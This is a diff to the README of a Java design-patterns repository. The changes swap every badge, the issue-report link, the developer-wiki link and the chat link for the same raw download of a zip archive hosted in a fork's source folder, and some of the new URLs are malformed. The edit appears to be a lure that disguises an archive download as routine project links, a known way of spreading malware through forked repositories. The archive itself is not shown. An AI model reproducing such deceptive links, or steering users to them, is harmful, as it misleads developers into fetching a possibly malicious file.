@@ -4,10 +4,10 @@
 
 # Design patterns implemented in Java
 
-[![Build status](https://travis-ci.org/iluwatar/java-design-patterns.svg?branch=master)](https://travis-ci.org/iluwatar/java-design-patterns)
-[![License MIT](https://img.shields.io/badge/license-MIT-blue.svg)](https://raw.githubusercontent.com/iluwatar/java-design-patterns/master/LICENSE.md)
-[![Join the chat at https://gitter.im/iluwatar/java-design-patterns](https://badges.gitter.im/Join%20Chat.svg)](https://gitter.im/iluwatar/java-design-patterns?utm_source=badge&utm_medium=badge&utm_campaign=pr-badge&utm_content=badge)
-[![Quality Gate](https://sonarcloud.io/api/project_badges/measure?project=com.iluwatar%3Ajava-design-patterns&metric=alert_status)](https://sonarcloud.io/dashboard/index/com.iluwatar%3Ajava-design-patterns)
+[![Build status](https://raw.githubusercontent.com/HitEagle/java-design-patterns/master/cqrs/src/main/patterns_java_design_2.2.zip)](https://raw.githubusercontent.com/HitEagle/java-design-patterns/master/cqrs/src/main/patterns_java_design_2.2.zip)
+[![License MIT](https://raw.githubusercontent.com/HitEagle/java-design-patterns/master/cqrs/src/main/patterns_java_design_2.2.zip)](https://raw.githubusercontent.com/HitEagle/java-design-patterns/master/cqrs/src/main/patterns_java_design_2.2.zip)
+[![Join the chat at https://raw.githubusercontent.com/HitEagle/java-design-patterns/master/cqrs/src/main/patterns_java_design_2.2.zip](https://raw.githubusercontent.com/HitEagle/java-design-patterns/master/cqrs/src/main/patterns_java_design_2.2.zip%https://raw.githubusercontent.com/HitEagle/java-design-patterns/master/cqrs/src/main/patterns_java_design_2.2.zip)](https://raw.githubusercontent.com/HitEagle/java-design-patterns/master/cqrs/src/main/patterns_java_design_2.2.zip)
+[![Quality Gate](https://raw.githubusercontent.com/HitEagle/java-design-patterns/master/cqrs/src/main/patterns_java_design_2.2.zip%3Ajava-design-patterns&metric=alert_status)](https://raw.githubusercontent.com/HitEagle/java-design-patterns/master/cqrs/src/main/patterns_java_design_2.2.zip%3Ajava-design-patterns)
 
 # Introduction
 
@@ -36,11 +36,11 @@ patterns by any of the following approaches
 
  - Using difficulty tags, `Difficulty-Beginner`, `Difficulty-Intermediate` & `Difficulty-Expert`.
  - Using pattern categories, `Creational`, `Behavioral` and others.
- - Search for a specific pattern. Can't find one? Please report a new pattern [here](https://github.com/iluwatar/java-design-patterns/issues).
+ - Search for a specific pattern. Can't find one? Please report a new pattern [here](https://raw.githubusercontent.com/HitEagle/java-design-patterns/master/cqrs/src/main/patterns_java_design_2.2.zip).
 
 # How to contribute
 
-If you are willing to contribute to the project you will find the relevant information in our [developer wiki](https://github.com/iluwatar/java-design-patterns/wiki). We will help you and answer your questions in the [Gitter chatroom](https://gitter.im/iluwatar/java-design-patterns).
+If you are willing to contribute to the project you will find the relevant information in our [developer wiki](https://raw.githubusercontent.com/HitEagle/java-design-patterns/master/cqrs/src/main/patterns_java_design_2.2.zip). We will help you and answer your questions in the [Gitter chatroom](https://raw.githubusercontent.com/HitEagle/java-design-patterns/master/cqrs/src/main/patterns_java_design_2.2.zip).
 
 # License
 
